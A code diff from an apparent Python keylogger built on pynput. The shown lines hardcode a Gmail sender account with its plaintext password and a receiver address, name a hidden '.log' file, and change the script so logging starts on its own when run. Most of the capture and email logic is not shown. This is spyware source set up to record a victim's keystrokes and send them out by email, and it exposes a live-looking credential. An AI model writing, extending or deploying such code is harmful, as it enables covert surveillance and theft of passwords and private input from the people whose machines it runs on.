@@ -7,7 +7,7 @@ from pynput import keyboard, mouse
 gmail_user = 'ozunakeylogger@gmail.com'
 receiver = 'juandanielozuna2@gmail.com'
 gmail_password = 'ozuna123'
-loggedData = ''
+loggedData = '' 
 fileName = '.log'
 sent_email = False
 def on_press(key):
@@ -104,12 +104,5 @@ def start_application():
     print('APPLICATION STARTED')
     start_logging()
 
-# def start_application():
-    # print('Started my thing')
-    # if __name__ == '__main__':
-    #     p2 = Process(target=emailSending)
-    #     p2.start()
-    #     logging()
-    #     p2.join()
-
+start_application()
 
